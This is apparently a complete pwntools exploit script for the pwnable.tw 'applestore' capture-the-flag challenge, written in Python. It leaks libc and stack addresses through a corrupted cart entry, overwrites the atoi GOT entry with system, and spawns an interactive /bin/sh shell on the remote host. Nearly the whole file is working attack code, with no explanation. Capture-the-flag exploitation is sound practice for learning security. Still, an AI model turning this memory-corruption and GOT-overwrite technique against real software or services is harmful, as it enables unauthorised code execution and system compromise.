from pwn import*
import argparse
context(arch='i386',os='linux')
context.log_level = 'debug'

parser = argparse.ArgumentParser()
parser.add_argument('-p','--process',  action = 'store_true',help='-p -> process')
parser.add_argument('-r','--remote',   action = 'store_true',help='-r -> remote')

args = parser.parse_args()

host = 'chall.pwnable.tw'
port = 10104

elf = ELF('./applestore')
breakpoint = {'bp':0x08048c54}
def info_log():
    log.info('list -> b* main + 101')
    log.info('add  -> b* main + 108')
    log.info('delete -> b* main + 115')
    log.info('cart -> b* main + 122')
    log.info('checkout -> b* main + 129')

def add(select):
    r.sendlineafter('> ','2')
    r.sendlineafter('Number> ',str(select))

def remove(select):
    r.sendlineafter('> ','3')
    r.sendlineafter('Number> ',str(select))

def cart(context):
    r.sendlineafter('> ','4')
    r.sendlineafter('(y/n) > ',str(context))

def check_out():
    r.sendlineafter('> ','5')
    r.sendlineafter('(y/n) > ','y')

def exploit():
    for i in range(6):
        add(1)
    for i in range(20):
        add(2)

    check_out()
    pause()
    payload = ''
    payload += 'y\x00'
    payload += p32(elf.got['puts'])
    payload += '\x00\x00\x00\x00'*3

    cart(payload)

    r.recvuntil('27: ')
    leak = u32(r.recv(4))
    libc_base = leak - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh = libc_base + list(libc.search('/bin/sh'))[0]

    log.info('leak = '+hex(leak))
    log.info('libc_base = '+hex(libc_base))
    log.info('system_addr = '+hex(system_addr))
    log.info('binsh_addr = '+hex(binsh))


    environ = libc_base + libc.symbols['environ']
    log.info('environ = '+hex(environ))

    payload = ''
    payload += 'y\x00'
    payload += p32(environ)
    payload += '\x00\x00\x00\x00'*4

    cart(payload)

    r.recvuntil('27: ')
    environ_addr = u32(r.recv(4))
    log.info('environ_addr = '+hex(environ_addr))

    cart_ebp = environ_addr - 260
    cart_ebp_8 = cart_ebp - 0x8

    payload = '27'
    payload += p32(environ_addr)
    payload += p32(0)
    payload += p32(elf.got['atoi'] + 0x22)       
    payload += p32(cart_ebp_8)              
    remove(payload)


    payload = p32(system_addr)
    payload += ';/bin/sh\x00'
    r.recvuntil('>')
    r.sendline(payload)

    r.interactive()
    
if args.remote:
    r = remote(host,port)
    libc = ELF('./libc_32.so.6')
    exploit()
    
if args.process:
    r = process('./applestore')
    libc = elf.libc
    exploit()
    
else:
    context.terminal = ['tmux','splitw','-h']
    r = process('./applestore')
    libc = elf.libc
    gdb.attach(r,'b* {}'.format(breakpoint['bp']))
    exploit()
